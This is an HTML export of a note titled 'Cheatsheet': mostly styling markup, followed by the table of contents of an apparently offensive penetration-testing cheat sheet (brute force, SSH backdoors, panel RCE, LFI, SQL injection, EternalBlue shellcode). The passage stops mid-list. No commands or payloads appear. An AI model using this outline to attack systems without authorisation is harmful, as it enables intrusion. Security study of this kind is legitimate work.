
				<!DOCTYPE html>
				<html>
					<head>
						<meta charset="UTF-8">
						<meta name="viewport" content="width=device-width, initial-scale=1" />
						<link rel="stylesheet" href="pluginAssets/katex/katex.css"><script type="application/javascript" src="pluginAssets/mermaid/mermaid.min.js"></script><script type="application/javascript" src="pluginAssets/mermaid/mermaid_render.js"></script><link rel="stylesheet" href="pluginAssets/highlight.js/atom-one-light.css">
						<title>Cheatsheet</title>
					</head>
					<body>
						<div class="exported-note"><div class="exported-note-title">Cheatsheet</div>

<style>
		/* https://necolas.github.io/normalize.css/ */
		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}

		body {
			font-size: 15px;
			color: #32373F;
			word-wrap: break-word;
			line-height: 1.6em;
			background-color: #ffffff;
			font-family: 'Avenir', 'Arial', sans-serif;
			padding-bottom: 0px;
			padding-top: 0px;
		}
		kbd {
			border: 1px solid rgb(220, 220, 220);
			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
			padding: 2px 4px;
			border-radius: 3px;
			background-color: rgb(243, 243, 243);
		}
		::-webkit-scrollbar {
			width: 7px;
			height: 7px;
		}
		::-webkit-scrollbar-corner {
			background: none;
		}
		::-webkit-scrollbar-track {
			border: none;
		}
		::-webkit-scrollbar-thumb {
			background: rgba(100, 100, 100, 0.3); 
			border-radius: 5px;
		}
		::-webkit-scrollbar-track:hover {
			background: rgba(0, 0, 0, 0.1); 
		}
		::-webkit-scrollbar-thumb:hover {
			background: rgba(100, 100, 100, 0.7); 
		}

		

		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */

		#rendered-md > h1:first-child,
		#rendered-md > h2:first-child,
		#rendered-md > h3:first-child,
		#rendered-md > h4:first-child,
		#rendered-md > ul:first-child,
		#rendered-md > ol:first-child,
		#rendered-md > table:first-child,
		#rendered-md > blockquote:first-child,
		#rendered-md > img:first-child,
		#rendered-md > p:first-child {
			margin-top: 0;
			padding-top: 0;
		}
		
		p, h1, h2, h3, h4, h5, h6, ul, table {
			margin-top: .6em;
			margin-bottom: 1.35em;

			/*
				Adds support for RTL text in the note body. It automatically detects the direction using the content.
				Issue: https://github.com/laurent22/joplin/issues/3991
			*/
			unicode-bidi: plaintext;
		}

		h1, h2, h3, h4, h5, h6, ul, table {
			margin-bottom: 0.65em;
		}

		h1, h2, h3, h4, h5, h6 {
			line-height: 1.5em;
		}
		h1 {
			font-size: 1.5em;
			font-weight: bold;
			border-bottom: 1px solid #dddddd;
			padding-bottom: .3em;
		}
		h2 {
			font-size: 1.3em;
			font-weight: bold;
			padding-bottom: .1em; */
		}
		h3 {
			font-size: 1.1em;
			font-weight: bold;
		}
		h4, h5, h6 {
			font-size: 1em;
			font-weight: bold;
		}

		.exported-note-title {
			font-size: 2em;
			font-weight: bold;
			margin-bottom: 0.8em;
			line-height: 1.5em;
			padding-bottom: .35em;
			border-bottom: 1px solid #dddddd;
		}

		a {
			color: #155BDA;
		}
		ul, ol {
			padding-left: 0;
			margin-left: 1.7em;
		}
		li {
			margin-bottom: .4em;
		}
		li p {
			margin-top: 0.2em;
			margin-bottom: 0;
		}

		.resource-icon {
			display: inline-block;
			position: relative;
			top: 0.3em;
			text-decoration: none;
			width: 1.2em;
			height: 1.4em;
			margin-right: 0.4em;
			background-color:  #155BDA;
		}
    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
     * into the css classes below.
     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
     * and of course finishes with ");
     * to precvent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
     * on the following line
     * */
		.fa-joplin {
			/* Awesome Font file */
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
		}
		.fa-file-image {
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
      -webkit-mask-repeat: no-repeat;
		}
		.fa-file-pdf {
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
      -webkit-mask-repeat: no-repeat;
		}
		.fa-file-word {
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
      -webkit-mask-repeat: no-repeat;
		}
		.fa-file-powerpoint {
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
      -webkit-mask-repeat: no-repeat;
		}
		.fa-file-excel {
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
      -webkit-mask-repeat: no-repeat;
		}
		.fa-file-audio {
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
      -webkit-mask-repeat: no-repeat;
		}
		.fa-file-video {
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
      -webkit-mask-repeat: no-repeat;
		}
		.fa-file-archive {
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
      -webkit-mask-repeat: no-repeat;
		}
		.fa-file-code {
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
      -webkit-mask-repeat: no-repeat;
		}
		.fa-file-alt, .fa-file-csv {
      /* fork-awesome doesn't have csv so we use the text icon */
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
      -webkit-mask-repeat: no-repeat;
		}
		.fa-file {
			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
      -webkit-mask-repeat: no-repeat;
		}
		blockquote {
			border-left: 4px solid rgb(220, 220, 220);
			padding-left: 1.2em;
			margin-left: 0;
			opacity: 0.7;
		}

		.jop-tinymce table,
		table {
			text-align: left;
			border-collapse: collapse;
			border: 1px solid rgb(220, 220, 220);
			background-color: #ffffff;
		}

		.jop-tinymce table td, .jop-tinymce table th,
		table td, th {
			text-align: left;
			padding: .5em 1em .5em 1em;
			font-size: 15;
			color: #32373F;
			font-family: 'Avenir', 'Arial', sans-serif;
		}

		.jop-tinymce table td,
		table td {
			border: 1px solid rgb(220, 220, 220);
		}

		.jop-tinymce table th,
		table th {
			border: 1px solid rgb(220, 220, 220);
			border-bottom: 2px solid rgb(220, 220, 220);
			background-color: rgb(247, 247, 247);
		}

		.jop-tinymce table tr:nth-child(even),
		table tr:nth-child(even) {
			background-color: rgb(247, 247, 247);
		}

		.jop-tinymce table tr:hover,
		table tr:hover {
			background-color: #e5e5e5;
		}

		hr {
			border: none;
			border-bottom: 2px solid #dddddd;
		}
		img {
			max-width: 100%;
			height: auto;
		}
		
		.inline-code,
		.mce-content-body code {
			border: 1px solid rgb(220, 220, 220);
			background-color: rgb(243, 243, 243);
			padding-right: .2em;
			padding-left: .2em;
			border-radius: .25em;
			color: rgb(0,0,0);
			font-size: .9em;
		}

		.highlighted-keyword {
			background-color: #F3B717;
			color: black;
		}

		.not-loaded-resource img {
			width: 1.15em;
			height: 1.15em;
			background: white;
			padding: 2px !important;
			border-radius: 2px;
			box-shadow: 0 1px 3px #000000aa;
		}

		a.not-loaded-resource img {
			margin-right: .2em;
		}

		a.not-loaded-resource {
			display: flex;
			flex-direction: row;
			align-items: center;
		}

		.md-checkbox input[type=checkbox]:checked {
			opacity: 0.7;
		}

		.jop-tinymce ul.joplin-checklist .checked,
		.md-checkbox .checkbox-label-checked {
			opacity: 0.5;
		}

		.exported-note {
			padding: 1em;
		}

		.joplin-editable .joplin-source {
			display: none;
		}

		mark {
			background: #F7D26E;
			color: black;
		}

		/* =============================================== */
		/* For TinyMCE */
		/* =============================================== */

		.mce-content-body {
			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
			padding: 5px 10px 10em 0;
		}

		/*
		.mce-content-body code {
			background-color: transparent;
		}
		*/

		.mce-content-body [data-mce-selected=inline-boundary] {
			background-color: transparent;
		}

		.mce-content-body .joplin-editable {
			cursor: pointer !important;
		}

		.mce-content-body.mce-content-readonly {
			opacity: 0.5;
		}

		/* We need that to make sure click events have the A has a target */
		.katex a span {
			pointer-events: none;
		}

		.media-player {
			width: 100%;
			margin-top: 10px;
		}

		.media-player.media-pdf {
			min-height: 100vh;
		}

		/* Clear the CODE style if the element is within a joplin-editable block */
		.mce-content-body .joplin-editable code {
			border: none;
			background: none;
			padding: 0;
			color: inherit;
			font-size: inherit;
		}

		/* To make code blocks horizontally scrollable */
		/* https://github.com/laurent22/joplin/issues/5740 */
		pre.hljs {
			overflow-x: auto;
		}

		/* =============================================== */
		/* For TinyMCE */
		/* =============================================== */

		@media print {
			body {
				height: auto !important;
			}

			pre {
				white-space: pre-wrap;
			}

			.code, .inline-code {
				border: 1px solid #CBCBCB;
			}

			#joplin-container-content {
				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
				   around various issues related to scrolling. However when printing we don't want this
				   fixed size as that would crop the content. So we set it to auto here. "important" is
				   needed to override the style set by JavaScript at the element-level. */
				height: auto !important;
			}
		}
	

				/*
					FOR THE MARKDOWN EDITOR
				*/

				/* Remove the indentation from the checkboxes at the root of the document
				   (otherwise they are too far right), but keep it for their children to allow
				   nested lists. Make sure this value matches the UL margin. */

				li.md-checkbox {
					list-style-type: none;
				}

				li.md-checkbox input[type=checkbox] {
					margin-left: -1.71em;
					margin-right: 0.7em;
				}
				
				ul.joplin-checklist {
					list-style:none;
				}

				/*
					FOR THE RICH TEXT EDITOR
				*/

				ul.joplin-checklist li::before {
					content:"\f14a";
					font-family:"Font Awesome 5 Free";
					background-size: 16px 16px;
					pointer-events: all;
					cursor: pointer;
					width: 1em;
					height: 1em;
					margin-left: -1.3em;
					position: absolute;
					color: #32373F;
				}

				.joplin-checklist li:not(.checked)::before {
					content:"\f0c8";
				}
.mermaid { background-color: white; width: 640px; }</style><div id="rendered-md"><hr>
<ul>
<li>
<p><a data-from-md title='#enumeration' href='#enumeration'>Enumeration</a></p>
</li>
<li>
<p><a data-from-md title='#nmap' href='#nmap'>NMAP</a></p>
<ul>
<li><a data-from-md title='#tcp' href='#tcp'>TCP</a></li>
<li><a data-from-md title='#udp' href='#udp'>UDP</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#autorecon' href='#autorecon'>AUTORECON</a></p>
</li>
<li>
<p><a data-from-md title='#ftp---21' href='#ftp---21'>FTP - 21</a></p>
<ul>
<li><a data-from-md title='#brute-force' href='#brute-force'>Brute force</a></li>
<li><a data-from-md title='#downloading-file' href='#downloading-file'>Downloading file</a></li>
<li><a data-from-md title='#uploading-file' href='#uploading-file'>Uploading file</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#ssh---22' href='#ssh---22'>SSH - 22</a></p>
<ul>
<li><a data-from-md title='#brute-force-1' href='#brute-force-1'>Brute force</a></li>
<li><a data-from-md title='#cve-2008-0166' href='#cve-2008-0166'>CVE-2008-0166</a></li>
<li><a data-from-md title='#ssh-backdoor---post-exploitation' href='#ssh-backdoor---post-exploitation'>SSH backdoor - post exploitation</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#dns---53' href='#dns---53'>DNS - 53</a></p>
<ul>
<li><a data-from-md title='#zone-transfert' href='#zone-transfert'>Zone transfert</a></li>
<li><a data-from-md title='#dns-brute-force' href='#dns-brute-force'>DNS brute force</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#finger---79' href='#finger---79'>FINGER - 79</a></p>
<ul>
<li><a data-from-md title='#user-enumeration' href='#user-enumeration'>User enumeration</a></li>
<li><a data-from-md title='#command-execution' href='#command-execution'>Command execution</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#http---https---80---443' href='#http---https---80---443'>HTTP - HTTPS - 80 - 443</a></p>
<ul>
<li><a data-from-md title='#automatic-scanners' href='#automatic-scanners'>Automatic scanners</a></li>
<li><a data-from-md title='#wordpress' href='#wordpress'>Wordpress</a>
<ul>
<li><a data-from-md title='#wordpress-panel-rce' href='#wordpress-panel-rce'>Wordpress panel RCE</a></li>
</ul>
</li>
<li><a data-from-md title='#drupal' href='#drupal'>Drupal</a>
<ul>
<li><a data-from-md title='#username-enumeration' href='#username-enumeration'>Username enumeration</a></li>
<li><a data-from-md title='#hidden-pages-enumeration' href='#hidden-pages-enumeration'>Hidden pages enumeration</a></li>
<li><a data-from-md title='#drupal-panel-rce' href='#drupal-panel-rce'>Drupal panel RCE</a></li>
</ul>
</li>
<li><a data-from-md title='#joomla' href='#joomla'>Joomla</a></li>
<li><a data-from-md title='#tomcat' href='#tomcat'>Tomcat</a>
<ul>
<li><a data-from-md title='#default-credentials' href='#default-credentials'>Default credentials</a></li>
<li><a data-from-md title='#brute-force-2' href='#brute-force-2'>Brute force</a></li>
<li><a data-from-md title='#tomcat-panel-rce' href='#tomcat-panel-rce'>Tomcat panel RCE</a></li>
</ul>
</li>
<li><a data-from-md title='#webdav' href='#webdav'>WebDav</a></li>
<li><a data-from-md title='#http-brute-force-authentication' href='#http-brute-force-authentication'>HTTP brute force authentication</a>
<ul>
<li><a data-from-md title='#http-basic-authentication' href='#http-basic-authentication'>HTTP basic authentication</a></li>
<li><a data-from-md title='#http-get-request' href='#http-get-request'>HTTP GET request</a></li>
<li><a data-from-md title='#http-post-request' href='#http-post-request'>HTTP POST request</a></li>
</ul>
</li>
<li><a data-from-md title='#spidering--brute-force-directories--files' href='#spidering--brute-force-directories--files'>Spidering / Brute force directories / files</a>
<ul>
<li><a data-from-md title='#file-backups' href='#file-backups'>File backups</a></li>
</ul>
</li>
<li><a data-from-md title='#local-file-inclusion--remote-file-inclusion---lfi--rfi' href='#local-file-inclusion--remote-file-inclusion---lfi--rfi'>Local File Inclusion / Remote File Inclusion - LFI / RFI</a>
<ul>
<li><a data-from-md title='#wrappers' href='#wrappers'>Wrappers</a>
<ul>
<li><a data-from-md title='#wrapper-phpfilter' href='#wrapper-phpfilter'>Wrapper php://filter</a></li>
<li><a data-from-md title='#wrapper-expect' href='#wrapper-expect'>Wrapper expect://</a></li>
<li><a data-from-md title='#wrapper-data' href='#wrapper-data'>Wrapper data://</a></li>
<li><a data-from-md title='#wrapper-input' href='#wrapper-input'>Wrapper input://</a></li>
</ul>
</li>
<li><a data-from-md title='#useful-lfi-list' href='#useful-lfi-list'>Useful LFI list</a></li>
<li><a data-from-md title='#tools' href='#tools'>Tools</a></li>
</ul>
</li>
<li><a data-from-md title='#command-injection' href='#command-injection'>Command injection</a></li>
<li><a data-from-md title='#deserialization' href='#deserialization'>Deserialization</a></li>
<li><a data-from-md title='#file-upload' href='#file-upload'>File upload</a></li>
<li><a data-from-md title='#sql-injection' href='#sql-injection'>SQL injection</a></li>
<li><a data-from-md title='#xss' href='#xss'>XSS</a></li>
<li><a data-from-md title='#other-web-vulnerabilities' href='#other-web-vulnerabilities'>Other web vulnerabilities</a></li>
<li><a data-from-md title='#upload-a-file-with-put' href='#upload-a-file-with-put'>Upload a file with PUT</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#kerberos---88' href='#kerberos---88'>KERBEROS - 88</a></p>
</li>
<li>
<p><a data-from-md title='#pop3---110' href='#pop3---110'>POP3 - 110</a></p>
<ul>
<li><a data-from-md title='#brute-force-3' href='#brute-force-3'>Brute force</a></li>
<li><a data-from-md title='#read-mail' href='#read-mail'>Read mail</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#snmp---161' href='#snmp---161'>SNMP - 161</a></p>
<ul>
<li><a data-from-md title='#brute-force-community-string' href='#brute-force-community-string'>Brute force community string</a></li>
<li><a data-from-md title='#modifying-snmp-values' href='#modifying-snmp-values'>Modifying SNMP values</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#ldap---389' href='#ldap---389'>LDAP - 389</a></p>
<ul>
<li><a data-from-md title='#scans' href='#scans'>Scans</a></li>
<li><a data-from-md title='#graphical-interface' href='#graphical-interface'>Graphical Interface</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#smb---445' href='#smb---445'>SMB - 445</a></p>
<ul>
<li><a data-from-md title='#version-if-nmap-didnt-detect-it' href='#version-if-nmap-didnt-detect-it'>Version if nmap didn't detect it</a></li>
<li><a data-from-md title='#scan-for-vulnerability' href='#scan-for-vulnerability'>Scan for vulnerability</a></li>
<li><a data-from-md title='#manual-testing' href='#manual-testing'>Manual testing</a></li>
<li><a data-from-md title='#brute-force-4' href='#brute-force-4'>Brute force</a></li>
<li><a data-from-md title='#mount-a-smb-share' href='#mount-a-smb-share'>Mount a SMB share</a></li>
<li><a data-from-md title='#get-a-shell' href='#get-a-shell'>Get a shell</a></li>
<li><a data-from-md title='#upload-with-smbmap' href='#upload-with-smbmap'>Upload with SMBMap</a></li>
<li><a data-from-md title='#EternalBlue-MS17-010' href='#EternalBlue-MS17-010'>EternalBlue (MS17-010)</a>
<ul>
<li><a data-from-md title='#check-if-vulnerable' href='#check-if-vulnerable'>Check if vulnerable</a></li>
<li><a data-from-md title='#prepare-shellcodes-and-listeners' href='#prepare-shellcodes-and-listeners'>Prepare shellcodes and listeners</a></li>
<li><a data-from-md title='#exploit' href='#exploit'>Exploit</a></li>
</ul>
<ul>
<li><a data-from-md title='#if-this-doesnt-work-try-this-one' href='#if-this-doesnt-work-try-this-one'>If this doesn't work, try this one</a></li>
</ul>
</li>
<li><a data-from-md title='#ms08-067' href='#ms08-067'>MS08-067</a></li>
<li><a data-from-md title='#cve-2017-7494' href='#cve-2017-7494'>CVE-2017-7494</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#mssql---1433' href='#mssql---1433'>MSSQL - 1433</a></p>
<ul>
<li><a data-from-md title='#get-information' href='#get-information'>Get information</a></li>
<li><a data-from-md title='#brute-force-5' href='#brute-force-5'>Brute force</a></li>
<li><a data-from-md title='#having-credentials' href='#having-credentials'>Having credentials</a></li>
<li><a data-from-md title='#manual-exploit' href='#manual-exploit'>Manual exploit</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#nfs---2049' href='#nfs---2049'>NFS - 2049</a></p>
<ul>
<li><a data-from-md title='#show-mountable-nfs-shares' href='#show-mountable-nfs-shares'>Show Mountable NFS Shares</a></li>
<li><a data-from-md title='#mount-a-share' href='#mount-a-share'>Mount a share</a></li>
<li><a data-from-md title='#nfs-misconfigurations' href='#nfs-misconfigurations'>NFS misconfigurations</a></li>
</ul>
</li>
<li>
<p><a data-from-md title='#mysql---3306' href='#mysql---3306'>MYSQL - 3306</a></p>
<ul>
<li><a data-from-md title='#brute-force-6' href='#brute-force-6'>Brute force</a></li>
<li><a data-from-md title='#extracting-mysql-credentials-from-files' href='#extracting-mysql-credentials-from-files'>Extracting MySQL credentials from files</a></li>
<li><a data-from-md title='#connect' href='#connect'>Connect</a></li>
<li><a data-from-md title='#mysql-commands' href='#mysql-commands'>MySQL commands</a></li>
